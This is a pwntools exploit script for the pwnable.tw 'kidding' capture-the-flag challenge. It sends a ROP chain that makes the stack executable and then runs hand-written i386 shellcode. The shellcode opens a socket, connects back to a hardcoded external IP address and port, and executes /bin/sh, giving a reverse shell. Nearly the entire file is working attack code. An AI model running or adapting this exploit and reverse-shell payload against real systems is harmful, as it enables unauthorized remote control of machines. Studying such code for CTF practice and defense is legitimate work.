#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10303
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./kidding', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0804888F
            b* 0x080488B5
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
pop_eax = 0x080b8536
libc_stack_end = 0x080E9FC8
dl_make_stack_executable = exe.sym._dl_make_stack_executable
stack_prot = 0x080E9FEC
mov_eax_7 = 0x0808eff0
xor_ebp_0xe_al = 0x080e00e0
call_esp = 0x080c99b0

# PAYLOAD
payload = b'a'*8
payload += flat(
    stack_prot - 0xe,
    mov_eax_7,
    xor_ebp_0xe_al,
    pop_eax,
    libc_stack_end,
    dl_make_stack_executable,
    call_esp
    )

# syscall socket: socket(AF_INET, SOCK_STREAM, 0);
# syscall connect: connect(0, struct sockaddr *addr, socklen_t addrlen);
# syscall execve
# len = 100 - 36 = 64
shellcode = asm('''
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov eax, 0x167
    add bl, 2
    inc cl
    int 0x80
    mov bl, al

    mov eax, 0x16a
    push 0
    push 0xD6DC8A12
    push 0xa6390002
    mov ecx, esp
    add dl, 0x10
    int 0x80

    mov al, 0xb
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch='i386')
log.info("shellcode len: " + str(len(shellcode)))
# GDB()
p.send(payload + shellcode)

p.interactive()